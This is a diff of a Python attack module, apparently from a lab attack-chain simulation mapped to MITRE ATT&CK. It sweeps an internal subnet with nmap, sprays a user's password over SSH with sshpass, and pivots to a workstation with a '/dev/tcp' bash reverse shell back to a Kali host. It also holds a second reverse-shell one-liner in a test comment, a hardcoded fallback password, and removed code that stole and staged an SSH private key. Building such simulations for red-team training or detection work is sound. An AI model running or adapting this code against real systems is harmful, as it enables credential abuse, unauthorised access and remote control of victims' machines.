@@ -1,15 +1,32 @@
-import base64
 import re
+import shlex
 import socket
 import threading
 import time
 
+from chainlog import log
+
 # =============================================================================
-# lateral_movement.py — Lateral Movement via Stolen Deploy Key
+# lateral_movement.py — Network Discovery + Credential Stuffing + SSH Pivot
 # MITRE ATT&CK:
-#   T1552.001 – Credentials In Files   (key discovery in john's home on apache)
-#   T1021.004 – Remote Services: SSH   (key-authenticated SSH to workstation)
-#   T1078     – Valid Accounts         (reuse of john.stravidis identity)
+#   T1018     – Remote System Discovery   (nmap sweep of internal_net)
+#   T1046     – Network Service Discovery  (ssh service enumeration)
+#   T1110.004 – Brute Force: Credential Stuffing  (reuse john's password on all hosts)
+#   T1021.004 – Remote Services: SSH       (password-auth SSH to john's workstation)
+#   T1078     – Valid Accounts             (reuse of john.stravidis identity)
+# -----------------------------------------------------------------------------
+# All phases execute FROM apache via the root reverse shell.
+#
+# Phase 1 — NMAP scan of internal_net to find live SSH hosts.
+# Phase 2 — Credential stuffing: spray john's password across all discovered
+#            hosts.  Only john's workstation accepts it; luke's and vinzenz's
+#            deny it — generating T1110 auth.log artefacts on those boxes.
+# Phase 3 — Successful lateral move to john's workstation via password-auth SSH
+#            reverse shell back to kali.
+# Phase 4 — Confirm identity via 'id'.
+#
+# Note: john.stravidis has a deploy key at /home/john.stravidis/.ssh/id_ed25519
+# on Apache — theoretical SSH access back to Apache, not used in this chain.
 # =============================================================================
 
 KALI_HOST        = "10.10.0.2"
@@ -18,9 +35,21 @@ WORKSTATION_USER = "john.stravidis"
 WORKSTATION_PORT = 22
 PORT_JOHN        = 6666
 
-DEPLOY_LOG_PATH  = "/opt/waystar-connect/deploy.log"
-REMOTE_KEY_PATH  = "/home/john.stravidis/.ssh/id_ed25519"
-STAGED_KEY_PATH  = "/tmp/john_deploy_key"
+INTERNAL_SUBNET  = "10.30.0.0/24"
+SSH_PORT         = 22
+SCAN_OUTPUT_FILE = "/tmp/lm-scan.gnmap"
+
+# Fallback password used when the creds step was skipped (--only lateral).
+_FALLBACK_PASSWORD = "waystar2026!"
+
+# Pure infrastructure addresses with no user sshd worth spraying:
+#   .1   bridge gateway     .2   apache (we are already root here)
+#   .3   router public leg  .4   router internal leg
+#   .6   db-internal (postgres only, no sshd)
+_SKIP_HOSTS = {"10.30.0.1", "10.30.0.2", "10.30.0.3", "10.30.0.4", "10.30.0.6"}
+
+# Fallback spray targets used when NMAP discovers no non-john hosts.
+_FALLBACK_SPRAY_TARGETS = ["10.30.0.7", "10.30.0.8"]
 
 
 def send_command(shell, command):
@@ -75,29 +104,13 @@ def _run_remote(shell, cmd, timeout=10):
             break
     shell.settimeout(prev_timeout)
 
-    # The sentinel appears in bash's echo of "echo SENTINEL_..._END".
-    # Everything before that echo is the actual command output (plus prompts).
+    # Everything before the sentinel echo is the real command output.
     if sentinel in buf:
         buf = buf[:buf.index(sentinel)]
 
     buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
     buf = buf.replace("\r", "")
     return buf.strip()
-
-
-def _stage_key_on_apache(root_shell, key_text):
-    """
-    Write the private key to STAGED_KEY_PATH on apache via the root shell.
-    Uses base64 encoding to avoid shell-quoting issues with PEM newlines.
-    Returns True on success.
-    """
-    key_b64 = base64.b64encode(key_text.encode()).decode()
-    stage_cmd = (
-        f"printf '%s\\n' '{key_b64}' | base64 -d > {STAGED_KEY_PATH} "
-        f"&& chmod 600 {STAGED_KEY_PATH} && echo KEY_OK"
-    )
-    result = _run_remote(root_shell, stage_cmd)
-    return "KEY_OK" in result
 
 
 def _read_id(shell, timeout=10):
@@ -120,113 +133,168 @@ def _read_id(shell, timeout=10):
     return response
 
 
-def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
-                        workstation_port, kali_host, kali_port):
-    """
-    SSH from apache to workstation and trigger a reverse bash shell back to kali.
-    Runs in a background thread — the connection stays open while the shell lives.
-    """
-    ssh_cmd = (
-        f"ssh -f -n -i {STAGED_KEY_PATH} "
+def _parse_gnmap_hosts(gnmap_text):
+    """Return a list of IPs whose grepable-nmap line shows port 22/open."""
+    hosts = []
+    for line in gnmap_text.splitlines():
+        if not line.startswith("Host:"):
+            continue
+        if "22/open" not in line:
+            continue
+        m = re.search(r"Host:\s+(\S+)", line)
+        if m:
+            hosts.append(m.group(1))
+    return hosts
+
+
+def _try_password(root_shell, ip, user, pwd, port):
+    """Attempt SSH with a single password via sshpass. Returns (success, output)."""
+    cmd = (
+        f"sshpass -p {shlex.quote(pwd)} ssh "
         f"-o StrictHostKeyChecking=accept-new "
         f"-o UserKnownHostsFile=/dev/null "
+        f"-o PasswordAuthentication=yes "
+        f"-o PubkeyAuthentication=no "
+        f"-o PreferredAuthentications=password "
+        f"-o NumberOfPasswordPrompts=1 "
+        f"-o ConnectTimeout=5 "
+        f"-p {port} "
+        f"{user}@{ip} id 2>&1"
+    )
+    out = _run_remote(root_shell, cmd, timeout=12)
+    return ("uid=" in out and user in out), out
+
+
+def _denial_reason(out):
+    """Classify an SSH auth failure output into a short human-readable reason."""
+    if "Permission denied" in out or "publickey" in out:
+        return "permission denied"
+    if "Connection refused" in out:
+        return "connection refused"
+    last_line = out.splitlines()[-1] if out else ""
+    return last_line or "no response"
+
+
+def _log_spray_result(ip, user, success, out, workstation_ip):
+    """Log a single credential-stuffing attempt outcome."""
+    if ip == workstation_ip:
+        if success:
+            log(f"[+] {ip:<14} {user}  → AUTH OK  (john's workstation)")
+        else:
+            log(f"[-] {ip:<14} {user}  → {_denial_reason(out)}  "
+                f"(expected success on john's workstation)")
+    elif success:
+        log(f"[!] {ip:<14} {user}  → AUTH OK (unexpected)")
+    else:
+        log(f"[-] {ip:<14} {user}  → {_denial_reason(out)}")
+
+
+def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
+                        workstation_port, kali_host, kali_port, password):
+    """
+    SSH from apache to workstation using john's password and trigger a reverse
+    bash shell back to kali.  Runs in a background thread.
+    """
+    ssh_cmd = (
+        f"sshpass -p {shlex.quote(password)} ssh "
+        f"-o StrictHostKeyChecking=accept-new "
+        f"-o UserKnownHostsFile=/dev/null "
+        f"-o PasswordAuthentication=yes "
+        f"-o PubkeyAuthentication=no "
+        f"-o PreferredAuthentications=password "
+        f"-o ConnectTimeout=5 "
         f"-p {workstation_port} "
         f"{workstation_user}@{workstation_ip} "
-        f'"bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1" '
+        f'"bash -i > /dev/tcp/{kali_host}/{kali_port} 2>/dev/null 0>&1" '
         f">/dev/null 2>&1 &"
     )
     send_command(root_shell, ssh_cmd)
 
 
-def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
-        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT):
+def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
+        workstation_user=WORKSTATION_USER, workstation_port=WORKSTATION_PORT,
+        john_password=None):
     """
-    Execute the lateral-movement step.
+    Execute the full lateral-movement step: NMAP discovery, credential stuffing
+    (john's password) across all discovered hosts, then pivot to john's workstation.
 
     Args:
         root_shell (socket):    root shell on apache (from privesc step).
         kali_host (str):        kali IP for reverse-shell callback.
-        workstation_ip (str):   target workstation IP, or None to discover
-                                via deploy.log (standalone / fallback mode).
-        workstation_user (str): SSH username on workstation.
-        workstation_port (int): SSH port on workstation.
+        workstation_ip (str):   john's workstation IP (used to identify the
+                                successful target and trigger the reverse shell).
+        workstation_user (str): SSH username on john's workstation.
+        workstation_port (int): SSH port on all targets.
+        john_password (str):    john's password from the creds step; falls back
+                                to _FALLBACK_PASSWORD when running standalone.
 
     Returns:
-        socket: reverse shell as john.stravidis on the workstation, or None.
+        dict with:
+            john_shell                       — socket (or None on failure)
+            failed_lateral_targets           — IPs where auth was denied
+            failed_lateral_password_failures — (ip, pwd) pairs that were denied
     """
-    print("\n[*] Starting lateral movement to workstation...")
+    log("\n[*] Starting lateral movement to workstation...")
+
+    if john_password is None:
+        log("[!] No password from creds step — using fallback (run creds first for accurate results)")
+        john_password = _FALLBACK_PASSWORD
 
     # ------------------------------------------------------------------
-    # Phase 1 — Credential discovery: deploy.log + private key on apache
+    # Phase 1 — NMAP scan (T1018 / T1046)
     # ------------------------------------------------------------------
-    # workstation_ip=None  → parse deploy.log (standalone / --only lateral)
-    # workstation_ip=<ip>  → creds step already discovered it, skip parsing
-    if workstation_ip is not None:
-        print(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
-    else:
-        workstation_ip = WORKSTATION_IP   # set fallback before possible override below
-        print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
-        log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
-
-        match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
-        if match:
-            workstation_user = match.group(1)
-            workstation_ip   = match.group(2)
-            print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
-        else:
-            print(f"[!] Could not parse deploy.log; using defaults "
-                  f"({workstation_user}@{workstation_ip})")
-
-    print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
-    raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)
-
-    key_start = raw_key.find("-----BEGIN OPENSSH PRIVATE KEY-----")
-    key_end   = raw_key.find("-----END OPENSSH PRIVATE KEY-----")
-    if key_start < 0 or key_end < 0:
-        print(f"[-] Private key not found at {REMOTE_KEY_PATH}")
-        return None
-    key_text = raw_key[key_start:key_end + len("-----END OPENSSH PRIVATE KEY-----")] + "\n"
-    print("[+] Deploy key retrieved")
-
-    # ------------------------------------------------------------------
-    # Phase 2 — Stage key on apache, pre-verify SSH connectivity
-    # ------------------------------------------------------------------
-    print(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
-    if not _stage_key_on_apache(root_shell, key_text):
-        print("[-] Failed to stage deploy key on apache")
-        return None
-    print("[+] Key staged successfully")
-
-    print(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
-    verify_out = _run_remote(
-        root_shell,
-        f"ssh -i {STAGED_KEY_PATH} "
-        f"-o StrictHostKeyChecking=accept-new "
-        f"-o UserKnownHostsFile=/dev/null "
-        f"-o ConnectTimeout=8 "
-        f"-p {workstation_port} "
-        f"{workstation_user}@{workstation_ip} id",
-        timeout=15,
+    log(f"[*] Scanning {INTERNAL_SUBNET} for live SSH hosts (nmap from apache)...")
+    scan_cmd = (
+        f"nmap -Pn -n -p {SSH_PORT} --open "
+        f"-oG {SCAN_OUTPUT_FILE} {INTERNAL_SUBNET} >/dev/null && "
+        f"cat {SCAN_OUTPUT_FILE}"
     )
-    if "uid=" not in verify_out:
-        print(f"[-] SSH pre-check failed. Output: {verify_out!r}")
-        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
-        return None
-    print(f"[+] SSH pre-check passed: {verify_out.strip()}")
+    scan_out = _run_remote(root_shell, scan_cmd, timeout=60)
+    _run_remote(root_shell, f"rm -f {SCAN_OUTPUT_FILE}")
+
+    discovered = [ip for ip in _parse_gnmap_hosts(scan_out) if ip not in _SKIP_HOSTS]
+    if not discovered:
+        log(f"[-] No SSH hosts discovered on {INTERNAL_SUBNET} — using fallback targets")
+        discovered = [workstation_ip] + list(_FALLBACK_SPRAY_TARGETS)
+    else:
+        log(f"[+] Discovered {len(discovered)} live SSH host(s): {', '.join(discovered)}")
 
     # ------------------------------------------------------------------
-    # Phase 3 — Set up listener and trigger reverse shell
+    # Phase 2 — Credential stuffing (T1110.004 / T1078)
+    # Try john's password on every discovered host in NMAP order.
+    # Only john's workstation is expected to accept it.
     # ------------------------------------------------------------------
+    log(f"\n[*] Credential stuffing {workstation_user}'s password across "
+        f"{len(discovered)} host(s)...")
+    password_failures: list[tuple[str, str]] = []
+
+    for ip in discovered:
+        success, out = _try_password(root_shell, ip, workstation_user,
+                                     john_password, workstation_port)
+        _log_spray_result(ip, workstation_user, success, out, workstation_ip)
+        if not success and ip != workstation_ip:
+            password_failures.append((ip, john_password))
+        time.sleep(0.3)
+
+    failed_targets = [ip for ip, _ in password_failures]
+    log(f"\n[*] Credential stuffing complete — {len(password_failures)} host(s) denied access")
+
+    # ------------------------------------------------------------------
+    # Phase 3 — Set up listener and trigger reverse shell (T1021.004)
+    # ------------------------------------------------------------------
+    log(f"\n[*] Pivoting to john's workstation at "
+        f"{workstation_user}@{workstation_ip}...")
+
     john_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     john_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     john_server.bind(("0.0.0.0", PORT_JOHN))
     john_server.listen(1)
-    print(f"[*] Waiting for john.stravidis shell on port {PORT_JOHN}...")
+    log(f"[*] Waiting for {workstation_user} shell on port {PORT_JOHN}...")
 
     t = threading.Thread(
         target=_fire_reverse_shell,
         args=(root_shell, workstation_user, workstation_ip,
-              workstation_port, kali_host, PORT_JOHN),
+              workstation_port, kali_host, PORT_JOHN, john_password),
         daemon=True,
     )
     t.start()
@@ -234,35 +302,35 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
     john_server.settimeout(20)
     try:
         john_shell, addr = john_server.accept()
-        print(f"[+] Shell received from {addr[0]}")
+        log(f"[+] Shell received from {addr[0]}")
     except socket.timeout:
-        print("[-] Timeout — no shell received from workstation")
-        print("    → check workstation can reach kali: route -n")
-        print(f"    → check ssh works manually: ssh -i {STAGED_KEY_PATH} "
-              f"{workstation_user}@{workstation_ip}")
-        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
-        print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
-        return None
+        log("[-] Timeout — no shell received from workstation")
+        log("    → check workstation can reach kali: route -n")
+        log("    → verify ssh manually: sshpass -p '<password>' ssh "
+            f"{workstation_user}@{workstation_ip}")
+        return {"john_shell": None, "failed_lateral_targets": failed_targets,
+                "failed_lateral_password_failures": password_failures}
     finally:
         john_server.close()
 
     # ------------------------------------------------------------------
-    # Phase 4 — Confirm identity + clean up staged key
+    # Phase 4 — Confirm identity
     # ------------------------------------------------------------------
     time.sleep(1)
     response = _read_id(john_shell)
 
-    if "john.stravidis" in response:
-        print("[+] Lateral movement successful!")
-        print(f"[+] {response.strip()}")
+    if workstation_user in response:
+        log("[+] Lateral movement successful!")
+        log(f"[+] {response.strip()}")
     else:
-        print("[-] john.stravidis not confirmed in id output")
-        print(f"[?] Response: {response!r}")
+        log("[-] User not confirmed in id output")
+        log(f"[?] Response: {response!r}")
 
-    send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
-    print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
-
-    return john_shell
+    return {
+        "john_shell": john_shell,
+        "failed_lateral_targets": failed_targets,
+        "failed_lateral_password_failures": password_failures,
+    }
 
 
 # Test mode — not executed when imported by main.py.
@@ -270,7 +338,7 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
 # Then in another terminal:
 #   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
-    print("[*] Test mode — waiting for root shell on port 5555")
+    log("[*] Test mode — waiting for root shell on port 5555")
 
     test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -279,9 +347,9 @@ if __name__ == "__main__":
 
     try:
         root_shell_sock, addr = test_server.accept()
-        print(f"[+] Root shell received from {addr[0]}")
+        log(f"[+] Root shell received from {addr[0]}")
     finally:
         test_server.close()
 
     result = run(root_shell_sock)
-    print(f"\n[*] Result: {'success — john.stravidis shell active' if result else 'failed'}")
+    log(f"\n[*] Result: {'success — john.stravidis shell active' if result['john_shell'] else 'failed'}")
